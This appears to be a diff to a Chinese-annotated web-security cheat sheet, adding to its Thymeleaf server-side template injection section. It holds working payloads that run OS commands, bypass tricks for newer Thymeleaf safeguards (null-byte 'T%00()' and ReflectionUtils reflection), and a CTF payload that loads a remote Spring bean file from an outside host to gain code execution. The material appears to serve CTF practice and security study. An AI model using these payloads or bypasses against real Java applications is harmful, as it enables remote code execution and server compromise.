@@ -2754,12 +2754,22 @@ Server-Side Template Injection
 ## thymeleaf
 
 - Java
+- 常見注入情境: https://github.com/veracode-research/spring-view-manipulation/
 - Some payload
     - `__${T(java.lang.Runtime).getRuntime().availableProcessors()}__::..x`
     - `__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).next()}__::.x`
+- 高版本限制
+    - 檢查 view name 是否有 expression: [src link](https://github.com/thymeleaf/thymeleaf-spring/blob/f078508ce7d1d823373964551a007cd35fad5270/thymeleaf-spring6/src/main/java/org/thymeleaf/spring6/util/SpringRequestUtils.java#L42-L48)
+        - 繞過: `**{}` 邏輯問題 ([src link](https://github.com/thymeleaf/thymeleaf-spring/blob/f078508ce7d1d823373964551a007cd35fad5270/thymeleaf-spring6/src/main/java/org/thymeleaf/spring6/util/SpringRequestUtils.java#L87)) 
+    - 檢查 expression 是否有 object instantiation: [src link](https://github.com/thymeleaf/thymeleaf-spring/blob/f078508ce7d1d823373964551a007cd35fad5270/thymeleaf-spring6/src/main/java/org/thymeleaf/spring6/util/SpringStandardExpressionUtils.java#L38)
+        - 繞過: `T%00()` ([src link](https://github.com/spring-projects/spring-framework/blob/9cf7b0e230af83e08efa73a43334c75f6110988f/spring-expression/src/main/java/org/springframework/expression/spel/standard/Tokenizer.java#L260))
+    - `isMemberAllowed()` 檢查: [src link](https://github.com/thymeleaf/thymeleaf/blob/eb546cc968b4393f813c07c29de084740c1a2b2f/lib/thymeleaf/src/main/java/org/thymeleaf/util/ExpressionUtils.java#L187)
+        - 繞過: 透過 `org.springframework.util.ReflectionUtils` 來反射
 - Example
     - [WCTF 2020 - thymeleaf](https://github.com/w181496/CTF/tree/master/wctf2020/thymeleaf)
     - [DDCTF 2020 - Easy Web](https://l3yx.github.io/2020/09/04/DDCTF-2020-WEB-WriteUp/)
+    - Codegate 2023 - AI
+        - from Pew: `$__|{springRequestContext.getClass().forName("org.yaml.snakeyaml.Yaml").newInstance().load(thymeleafRequestContext.httpServletRequest.getParameter("a"))}|__(xx=id)?a=!!org.springframework.context.support.FileSystemXmlApplicationContext ["https://thegrandpewd.pythonanywhere.com/pwn.bean"]`
 
 ## Golang
 
